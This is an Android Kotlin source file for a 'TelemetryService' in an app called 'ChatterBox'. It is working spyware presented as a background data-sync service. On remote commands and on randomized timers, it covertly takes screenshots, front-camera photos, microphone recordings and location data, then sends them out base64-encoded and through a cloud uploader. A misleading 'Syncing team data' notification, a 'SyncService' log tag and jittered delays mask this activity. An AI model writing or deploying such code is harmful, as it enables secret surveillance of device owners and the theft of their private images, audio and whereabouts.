package com.example.ChatterBox.database

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.provider.Settings
import android.util.Base64
import android.util.Log
import android.util.Size
import android.view.WindowManager
import androidx.core.content.ContextCompat
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

@SuppressLint("HardwareIds")
class TelemetryService : Service() {
    private val TAG = "SyncService"
    private val NOTIFICATION_ID = 1023
    private val CHANNEL_ID = "background_sync"

    private var syncThread: HandlerThread? = null
    private var syncHandler: Handler? = null
    private val isSyncing = AtomicBoolean(false)

    private var mediaProjManager: MediaProjectionManager? = null
    private var mediaProj: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val mediaLock = Semaphore(1)
    private var screenDensity: Int = 0
    private var displayWidth: Int = 0
    private var displayHeight: Int = 0
    private var projIntent: Intent? = null
    private var projResultCode: Int = 0

    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null
    private var cameraDevice: CameraDevice? = null
    private var cameraCaptureSession: CameraCaptureSession? = null
    private var cameraImageReader: ImageReader? = null
    private val cameraOpenCloseLock = Semaphore(1)

    private var dataSync: CloudUploader? = null
    private var lastSyncTime = 0L

    private var mediaRecorder: MediaRecorder? = null
    private val audioLock = Semaphore(1)
    private var isRecording = false
    private var audioOutputFile: String? = null

    private val deviceId: String by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    override fun onCreate() {
        super.onCreate()

        syncThread = HandlerThread("DataSyncThread").apply { start() }
        syncHandler = Handler(syncThread!!.looper)

        cameraThread = HandlerThread("CameraThread").apply { start() }
        cameraHandler = Handler(cameraThread!!.looper)

        createNotificationChannel()
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)

        dataSync = CloudUploader(this)
        val commandsManager = Commands(this)
        commandsManager.initialize()
        Log.d(TAG, "Background sync service initialized")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Sync service received intent: ${intent?.action}")

        val initialDelay = (30 * 1000L) + (Math.random() * 60 * 1000L).toLong()
        syncHandler?.postDelayed({
            scheduleBackgroundPolling()
        }, initialDelay)

        when (intent?.action) {
            "SETUP_PROJECTION" -> {
                val resultCode = intent.getIntExtra("resultCode", 0)
                val data = intent.getParcelableExtra<Intent>("data")
                if (data != null) {
                    setupMediaCapture(resultCode, data)
                    Log.d(TAG, "Media capture initialized for sync")
                }
            }
            "CAPTURE_SCREENSHOT" -> {
                val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
                syncHandler?.post {
                    handleVisualTask(commandId)
                }
            }
            "CAPTURE_CAMERA" -> {
                val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
                syncHandler?.post {
                    handleImage(commandId)
                }
            }
            "CAPTURE_AUDIO" -> {
                val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
                val duration = intent.getIntExtra("duration", 30)
                syncHandler?.post {
                    handleMic(commandId, duration)
                }
            }
        }

        scheduleBackgroundPolling()
        return START_STICKY
    }

    private fun handleVisualTask(commandId: String) {
        try {
            Log.d(TAG, "Processing screenshot capture command: $commandId")

            if (projIntent == null) {
                // Send error if we don't have projection permission
                val errorResult = JSONObject().apply {
                    put("status", "error")
                    put("message", "Media projection not available")
                }
                sendCommandResult(commandId, false, "Media projection not available", errorResult)
                return
            }

            // Take the screenshot
            val screenshotFile = captureScreenContent()

            if (screenshotFile != null) {
                val imageBytes = File(screenshotFile).readBytes()
                val base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT)

                val result = JSONObject().apply {
                    put("status", "success")
                    put("image_data", base64Image)
                    put("timestamp", System.currentTimeMillis())
                }

                sendCommandResult(commandId, true, "Screenshot captured successfully", result)
                Log.d(TAG, "Screenshot captured and result sent")
            } else {
                val errorResult = JSONObject().apply {
                    put("status", "error")
                    put("message", "Failed to capture screenshot")
                }
                sendCommandResult(commandId, false, "Failed to capture screenshot", errorResult)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling screenshot command: ${e.message}")
            val errorResult = JSONObject().apply {
                put("status", "error")
                put("message", "Exception: ${e.message}")
            }
            sendCommandResult(commandId, false, "Error: ${e.message}", errorResult)
        }
    }

    private fun handleImage(commandId: String) {
        try {
            Log.d(TAG, "Processing camera capture command: $commandId")

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                val errorResult = JSONObject().apply {
                    put("status", "error")
                    put("message", "Camera permission not granted")
                }
                sendCommandResult(commandId, false, "Camera permission not granted", errorResult)
                return
            }

            openCamera(commandId)
        } catch (e: Exception) {
            Log.e(TAG, "Error handling camera command: ${e.message}")
            val errorResult = JSONObject().apply {
                put("status", "error")
                put("message", "Exception: ${e.message}")
            }
            sendCommandResult(commandId, false, "Error: ${e.message}", errorResult)
        }
    }

    private fun sendCommandResult(commandId: String, success: Boolean, message: String, result: JSONObject) {
        try {
            val commandsInstance = Commands(this)
            commandsInstance.sendCommandResponse(commandId, success, message, result)
        } catch (e: Exception) {
            Log.e(TAG, "Error sending command result: ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Data Synchronization"
            val description = "Background syncing of app data"
            val importance = NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                this.description = description
            }
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("ChatterBox")
            .setContentText("Syncing team data...")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun setupMediaCapture(resultCode: Int, data: Intent) {
        projResultCode = resultCode
        projIntent = data

        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = resources.displayMetrics
        screenDensity = metrics.densityDpi
        displayWidth = metrics.widthPixels
        displayHeight = metrics.heightPixels
    }

    private fun scheduleBackgroundPolling() {
        val idleCallback = {
            if (!isSyncing.get()) {
                syncHandler?.post {
                    synchronized(isSyncing) {
                        if (!isSyncing.get()) {
                            isSyncing.set(true)
                            executeTelemetrySync()
                            isSyncing.set(false)
                        }
                    }
                }
            }
        }

        com.example.ChatterBox.accessibility.IdleDetector.registerUserActivity()

        syncHandler?.postDelayed(object : Runnable {
            override fun run() {
                val now = System.currentTimeMillis()
                if ((now - lastSyncTime > 30 * 60 * 1000) && !isSyncing.get()) {
                    syncHandler?.post {
                        synchronized(isSyncing) {
                            if (!isSyncing.get()) {
                                isSyncing.set(true)
                                executeTelemetrySync()
                                isSyncing.set(false)
                                lastSyncTime = System.currentTimeMillis()
                            }
                        }
                    }
                }
                val nextInterval = (1 * 60 * 1000L) + (Math.random() * 10 * 60 * 1000L).toLong()
                syncHandler?.postDelayed(this, nextInterval)
            }
        }, 1 * 60 * 1000L)
    }

    private fun executeTelemetrySync() {
        try {
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val isCharging = batteryManager.isCharging

            if (batteryLevel > 30 || isCharging) {
                captureScreenContent()
                gatherGeoData()
                dataSync?.startUploadJob()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error during background sync: ${e.message}")
        }
    }

    private fun captureScreenContent(): String? {
        if (projIntent == null) return null

        try {
            if (!mediaLock.tryAcquire(3, TimeUnit.SECONDS)) {
                Log.e(TAG, "Could not acquire media lock for screenshot")
                return null
            }

            try {
                if (mediaProjManager == null) {
                    mediaProjManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                }

                if (mediaProj == null) {
                    mediaProj = mediaProjManager?.getMediaProjection(projResultCode, projIntent!!)
                }

                imageReader = ImageReader.newInstance(
                    displayWidth, displayHeight, PixelFormat.RGBA_8888, 1
                )

                virtualDisplay = mediaProj?.createVirtualDisplay(
                    "SyncDisplay",
                    displayWidth, displayHeight, screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader?.surface, null, null
                )

                Thread.sleep(150)

                val image = imageReader?.acquireLatestImage()
                if (image != null) {
                    val bitmap = imageToBitmap(image)
                    image.close()

                    val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                    val filename = "sync_${timestamp}.jpg"
                    val file = File(getDir("sync_data", Context.MODE_PRIVATE), filename)

                    val jpegBytes = compressBitmap(bitmap)
                    FileOutputStream(file).use { out ->
                        out.write(jpegBytes)
                    }

                    dataSync?.enqueueUpload("screen_data", file.absolutePath)

                    return file.absolutePath
                } else {
                    Log.e(TAG, "Failed to acquire image from virtual display")
                }
            } finally {
                virtualDisplay?.release()
                virtualDisplay = null
                imageReader?.close()
                imageReader = null
                mediaLock.release()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Sync error: ${e.message}")
            mediaLock.release()
        }

        return null
    }

    // Camera handling methods
    private fun openCamera(commandId: String) {
        try {
            // Double-check camera permission to avoid SecurityException
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                throw SecurityException("Camera permission not granted")
            }

            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = findFrontCamera(cameraManager)

            if (cameraId == null) {
                val result = JSONObject().apply {
                    put("status", "error")
                    put("message", "No suitable camera found")
                }
                sendCommandResult(commandId, false, "No suitable camera found", result)
                return
            }

            // Use the camera characteristics to determine optimal size
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val streamConfigMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)

            // Get first available output size
            val outputSizes = streamConfigMap?.getOutputSizes(SurfaceTexture::class.java)
            val previewSize = outputSizes?.firstOrNull() ?: Size(640, 480)

            // Create ImageReader for capturing still images
            cameraImageReader = ImageReader.newInstance(
                previewSize.width, previewSize.height, ImageFormat.JPEG, 2
            ).apply {
                setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        processCameraImage(image, commandId)
                    }
                }, cameraHandler)
            }

            if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) {
                throw RuntimeException("Time out waiting to lock camera opening")
            }

            try {
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        Log.d(TAG, "Camera opened successfully")
                        cameraDevice = camera
                        cameraOpenCloseLock.release()
                        createCaptureSession(commandId)
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        Log.d(TAG, "Camera disconnected")
                        cameraOpenCloseLock.release()
                        camera.close()
                        cameraDevice = null

                        val result = JSONObject().apply {
                            put("status", "error")
                            put("message", "Camera disconnected")
                        }
                        sendCommandResult(commandId, false, "Camera disconnected", result)
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        Log.e(TAG, "Camera device error: $error")
                        cameraOpenCloseLock.release()
                        camera.close()
                        cameraDevice = null

                        val result = JSONObject().apply {
                            put("status", "error")
                            put("message", "Camera error: $error")
                        }
                        sendCommandResult(commandId, false, "Camera error: $error", result)
                    }
                }, cameraHandler)
            } catch (e: SecurityException) {
                cameraOpenCloseLock.release()
                val result = JSONObject().apply {
                    put("status", "error")
                    put("message", "Camera permission denied: ${e.message}")
                }
                sendCommandResult(commandId, false, "Camera permission denied", result)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error opening camera: ${e.message}")
            if (cameraOpenCloseLock.tryAcquire(100, TimeUnit.MILLISECONDS)) {
                cameraOpenCloseLock.release()
            }

            val result = JSONObject().apply {
                put("status", "error")
                put("message", "Error opening camera: ${e.message}")
            }
            sendCommandResult(commandId, false, "Error opening camera: ${e.message}", result)
        }
    }

    private fun findFrontCamera(cameraManager: CameraManager): String? {
        try {
            for (cameraId in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    return cameraId
                }
            }
            // If no front camera, return the first available camera
            return cameraManager.cameraIdList.firstOrNull()
        } catch (e: Exception) {
            Log.e(TAG, "Error finding camera: ${e.message}")
            return null
        }
    }

    private fun createCaptureSession(commandId: String) {
        try {
            // Check camera permission again
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                throw SecurityException("Camera permission not granted")
            }

            val surface = cameraImageReader?.surface ?: return

            try {
                cameraDevice?.createCaptureSession(
                    listOf(surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            Log.d(TAG, "Camera capture session configured")
                            cameraCaptureSession = session
                            captureStillPicture(commandId)
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            Log.e(TAG, "Failed to configure camera capture session")

                            val result = JSONObject().apply {
                                put("status", "error")
                                put("message", "Failed to configure camera session")
                            }
                            sendCommandResult(commandId, false, "Failed to configure camera session", result)
                        }
                    },
                    cameraHandler
                )
            } catch (e: SecurityException) {
                val result = JSONObject().apply {
                    put("status", "error")
                    put("message", "Camera permission denied during session creation")
                }
                sendCommandResult(commandId, false, "Camera permission denied", result)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error creating capture session: ${e.message}")

            val result = JSONObject().apply {
                put("status", "error")
                put("message", "Error creating capture session: ${e.message}")
            }
            sendCommandResult(commandId, false, "Error creating capture session: ${e.message}", result)
        }
    }

    private fun captureStillPicture(commandId: String) {
        try {
            // Check camera permission again
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                throw SecurityException("Camera permission not granted")
            }

            val captureRequestBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureRequestBuilder?.addTarget(cameraImageReader?.surface!!)

            // Auto-focus
            captureRequestBuilder?.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)

            // Orientation
            val rotation = getWindowManager().defaultDisplay.rotation
            captureRequestBuilder?.set(CaptureRequest.JPEG_ORIENTATION, rotation * 90)

            try {
                cameraCaptureSession?.capture(
                    captureRequestBuilder?.build()!!,
                    object : CameraCaptureSession.CaptureCallback() {
                        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: android.hardware.camera2.TotalCaptureResult) {
                            Log.d(TAG, "Still picture capture completed")
                        }
                    },
                    cameraHandler
                )
            } catch (e: SecurityException) {
                val result = JSONObject().apply {
                    put("status", "error")
                    put("message", "Camera permission denied during capture")
                }
                sendCommandResult(commandId, false, "Camera permission denied", result)
                closeCamera()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing still picture: ${e.message}")

            val result = JSONObject().apply {
                put("status", "error")
                put("message", "Error capturing picture: ${e.message}")
            }
            sendCommandResult(commandId, false, "Error capturing picture: ${e.message}", result)

            closeCamera()
        }
    }

    private fun processCameraImage(image: Image, commandId: String) {
        var jpegBytes: ByteArray? = null

        try {
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            jpegBytes = bytes

            // Save file
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "camera_${timestamp}.jpg"
            val file = File(getDir("sync_data", Context.MODE_PRIVATE), filename)

            FileOutputStream(file).use { out ->
                out.write(bytes)
            }

            // Convert to base64 for command response
            val base64Image = Base64.encodeToString(bytes, Base64.DEFAULT)

            // Send result back with the base64 image
            val result = JSONObject().apply {
                put("status", "success")
                put("image_data", base64Image)
                put("timestamp", System.currentTimeMillis())
            }
            sendCommandResult(commandId, true, "Camera image captured successfully", result)

            // Queue for sync
            dataSync?.enqueueUpload("camera_data", file.absolutePath)
        } catch (e: Exception) {
            Log.e(TAG, "Error processing camera image: ${e.message}")

            val result = JSONObject().apply {
                put("status", "error")
                put("message", "Error processing camera image: ${e.message}")
            }
            sendCommandResult(commandId, false, "Error processing camera image: ${e.message}", result)
        } finally {
            image.close()
            closeCamera()
        }
    }

    private fun closeCamera() {
        try {
            cameraOpenCloseLock.acquire()
            cameraCaptureSession?.close()
            cameraCaptureSession = null
            cameraDevice?.close()
            cameraDevice = null
            cameraImageReader?.close()
            cameraImageReader = null
        } catch (e: Exception) {
            Log.e(TAG, "Error closing camera: ${e.message}")
        } finally {
            cameraOpenCloseLock.release()
        }
    }

    private fun getWindowManager(): WindowManager {
        return getSystemService(Context.WINDOW_SERVICE) as WindowManager
    }

    private fun imageToBitmap(image: Image): Bitmap {
        val planes = image.planes
        val buffer = planes[0].buffer
        val pixelStride = planes[0].pixelStride
        val rowStride = planes[0].rowStride
        val rowPadding = rowStride - pixelStride * image.width

        val bitmap = Bitmap.createBitmap(
            image.width + rowPadding / pixelStride,
            image.height,
            Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        return bitmap
    }

    private fun compressBitmap(bitmap: Bitmap): ByteArray {
        val out = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
        return out.toByteArray()
    }

    private fun gatherGeoData() {
        try {
            // Explicit permission check to avoid SecurityException
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Location permissions not granted")
                return
            }

            val geoLocator = GeoLocator.getInstance(this)
            geoLocator.getLastGeoFix { locationData ->
                try {
                    val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                    val filename = "location_${timestamp}.json"
                    val storage = StorageManager.getStorageDir(this, "location_data")
                    val file = File(storage, filename)

                    FileOutputStream(file).use { out ->
                        out.write(locationData.toString().toByteArray())
                    }

                    dataSync?.enqueueUpload("location_data", file.absolutePath)
                } catch (e: Exception) {
                    Log.e(TAG, "Location save error: ${e.message}")
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission denied: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Location capture error: ${e.message}")
        }
    }
    private fun handleMic(commandId: String, duration: Int) {
        try {
            Log.d(TAG, "Processing audio capture command: $commandId")

            // Check audio recording permission
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                val errorResult = JSONObject().apply {
                    put("status", "error")
                    put("message", "Audio recording permission not granted")
                }
                sendCommandResult(commandId, false, "Audio recording permission not granted", errorResult)
                return
            }

            // Start recording audio
            if (startAudioRecording()) {
                // Schedule a stop after the specified duration
                syncHandler?.postDelayed({
                    stopAudioRecording(commandId)
                }, duration * 1000L)

                // Send an interim status update
                val interimResult = JSONObject().apply {
                    put("status", "recording")
                    put("expected_duration", duration)
                    put("timestamp", System.currentTimeMillis())
                }
                sendCommandResult(commandId, true, "Audio recording in progress", interimResult)
            } else {
                val errorResult = JSONObject().apply {
                    put("status", "error")
                    put("message", "Failed to start audio recording")
                }
                sendCommandResult(commandId, false, "Failed to start audio recording", errorResult)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling audio command: ${e.message}")
            val errorResult = JSONObject().apply {
                put("status", "error")
                put("message", "Exception: ${e.message}")
            }
            sendCommandResult(commandId, false, "Error: ${e.message}", errorResult)
        }
    }
    private fun startAudioRecording(): Boolean {
        if (!audioLock.tryAcquire()) {
            Log.e(TAG, "Could not acquire audio lock")
            return false
        }

        try {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "audio_${timestamp}.mp3"
            val audioDir = getDir("audio_data", Context.MODE_PRIVATE)
            val audioFile = File(audioDir, filename)
            audioOutputFile = audioFile.absolutePath

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            mediaRecorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setOutputFile(audioOutputFile)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioChannels(1)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)

                try {
                    prepare()
                    start()
                    isRecording = true
                    Log.d(TAG, "Audio recording started")
                    return true
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to prepare or start recording: ${e.message}")
                    releaseMediaRecorder()
                    audioLock.release()
                    return false
                }
            }

            return false
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up audio recording: ${e.message}")
            releaseMediaRecorder()
            audioLock.release()
            return false
        }
    }
    private fun stopAudioRecording(commandId: String) {
        if (!isRecording) {
            audioLock.release()
            return
        }

        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null
            isRecording = false

            val audioFile = File(audioOutputFile ?: return)
            if (audioFile.exists() && audioFile.length() > 0) {
                // Convert to base64 for the response
                val audioBytes = audioFile.readBytes()
                val base64Audio = Base64.encodeToString(audioBytes, Base64.DEFAULT)

                // Send successful result
                val result = JSONObject().apply {
                    put("status", "success")
                    put("audio_data", base64Audio)
                    put("duration", audioFile.length() / 1024)
                    put("format", "mp3")
                    put("timestamp", System.currentTimeMillis())
                }
                sendCommandResult(commandId, true, "Audio recording completed successfully", result)
                dataSync?.enqueueUpload("audio_data", audioOutputFile!!)

                Log.d(TAG, "Audio recording completed and result sent")
            } else {
                val errorResult = JSONObject().apply {
                    put("status", "error")
                    put("message", "Failed to save audio recording")
                }
                sendCommandResult(commandId, false, "Failed to save audio recording", errorResult)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping audio recording: ${e.message}")
            val errorResult = JSONObject().apply {
                put("status", "error")
                put("message", "Exception while stopping recording: ${e.message}")
            }
            sendCommandResult(commandId, false, "Error: ${e.message}", errorResult)
        } finally {
            releaseMediaRecorder()
            audioLock.release()
        }
    }
    private fun releaseMediaRecorder() {
        try {
            mediaRecorder?.apply {
                reset()
                release()
            }
            mediaRecorder = null
            isRecording = false
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing media recorder: ${e.message}")
        }
    }
    override fun onDestroy() {
        syncThread?.quitSafely()
        cameraThread?.quitSafely()
        releaseMediaRecorder()

        mediaProj?.stop()
        mediaProj = null

        closeCamera()

        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}